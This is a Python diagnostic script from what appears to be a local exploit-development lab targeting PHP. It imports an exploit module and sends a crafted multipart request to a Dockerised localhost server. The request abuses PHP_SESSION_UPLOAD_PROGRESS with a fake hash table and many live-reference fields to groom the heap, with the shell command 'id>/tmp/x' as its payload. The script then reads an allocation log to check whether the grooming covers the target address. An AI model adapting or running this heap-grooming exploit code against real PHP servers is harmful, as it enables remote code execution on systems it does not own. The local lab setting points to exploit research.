#!/usr/bin/env python3
"""diag_stage3.py — measure where stage-3 allocations land on stock, via alloc_all.log interposer."""
import subprocess, sys, time
sys.path.insert(0, "/Users/bill/php2shell/lab")
sys.path.insert(0, "/Users/bill/php2shell/alvaro")
import exploit as alv          # noqa: E402
import exploit_stock           # noqa: F401,E402  (applies chunked-TE + big-_big overrides)

CHUNK = 0x7ffffe000000
t = alv.Target("http://localhost:18110/index.php", timeout=150)
ex = alv.Exploit(t, "id>/tmp/x", 0x5996e0, 0x7b47a0, htdata=0x7e0d8, huge_mb=140)

def clear_log():
    # truncate in place (NOT rm): workers hold the inode open; rm would orphan writes
    subprocess.run(["docker", "exec", "p2s", "sh", "-c", ": > /tmp/alloc_all.log 2>/dev/null || touch /tmp/alloc_all.log"])

def read_log():
    r = subprocess.run(["docker", "exec", "p2s", "cat", "/tmp/alloc_all.log"], capture_output=True)
    return r.stdout.decode("latin1").splitlines()

def report(lines, label, lo=0x7c000, hi=0x84000):
    print(f"\n===== {label} ({len(lines)} alloc lines) =====")
    inwin = []
    bigs = []
    for ln in lines:
        p = ln.split()
        if len(p) < 3 or p[0] not in ("M", "R"):
            continue
        try:
            size, addr = int(p[1]), int(p[2], 16)
        except ValueError:
            continue
        off = addr - CHUNK
        if 0 <= off < (1 << 21):
            inwin.append((off, p[0], size))
        if size >= 100000:
            bigs.append((addr, size))
    # show allocations near the assumed htdata window
    near = [x for x in inwin if lo <= x[0] <= hi]
    print(f"allocs within main chunk: {len(inwin)};  >=100KB (big field): {len(bigs)}")
    for a, s in bigs[:8]:
        print(f"   BIG size={s} addr=0x{a:x} off_from_chunk=0x{(a-CHUNK):x}")
    print(f"allocs in window [0x{lo:x},0x{hi:x}] (around htdata 0x7e0d8): {len(near)}")
    for off, op, size in sorted(near)[:40]:
        mark = " <== FAKE_HT(167)" if size == 167 else (" <== LIVE_REF(31)" if size == 31 else "")
        print(f"   {op} off=0x{off:x} size={size}{mark}")

# --- Phase A: arming only, see where the big field lands -------------------
clear_log(); time.sleep(0.3)
ex._oom_arm_pads()
time.sleep(0.5)
report(read_log(), "AFTER _oom_arm_pads (arming)")

# --- Phase B: full stage-3 exploit request, see where fake_ht/live_ref land -
clear_log(); time.sleep(0.3)
ht = ex._fake_ht(0x7e0d8); live = ex._live_ref(0x7e0d8)
parts = [{"name": "PHPSESSID", "data": b"a" * 100}, {"name": "PHP_SESSION_UPLOAD_PROGRESS", "data": b"pwn"}]
for i in range(8): parts.append({"name": "m%04d" % i, "data": b"M" * 100})
for i in range(80): parts.append({"name": (f"F{i:030d}")[:31], "data": b"z"})
for i in range(200): parts.append({"name": "r%04d" % i, "data": live})
parts.append({"name": (f"a{0:030d}")[:31], "data": ht})
resp = t.post(alv.multipart(parts, b"B" * 10), b"B" * 10, read_cap=65536, timeout=30)
time.sleep(0.5)
lines = read_log()
report(lines, "AFTER stage-3 exploit request", lo=0x7c000, hi=0x84000)

# where does the fake-HT carrier land? it is a ~168-192B value string, NOT exactly 167.
print("\n===== all >=100B allocs in main chunk during exploit request (fake HT carrier) =====")
carriers = []
live32 = []
for ln in lines:
    p = ln.split()
    if len(p) < 3 or p[0] not in ("M", "R"): continue
    try: size, addr = int(p[1]), int(p[2], 16)
    except ValueError: continue
    off = addr - CHUNK
    if not (0 <= off < (1 << 21)): continue
    if size >= 100:
        carriers.append((off, p[0], size))
    if size == 32:
        live32.append(off)
for off, op, size in sorted(carriers):
    print(f"   {op} off=0x{off:x} size={size}")
if live32:
    print(f"\n_live_ref(32B) count={len(live32)}  range=[0x{min(live32):x}, 0x{max(live32):x}]  (htdata target 0x7e0d8 {'COVERED' if min(live32)<=0x7e0d8<=max(live32) else 'NOT covered'})")
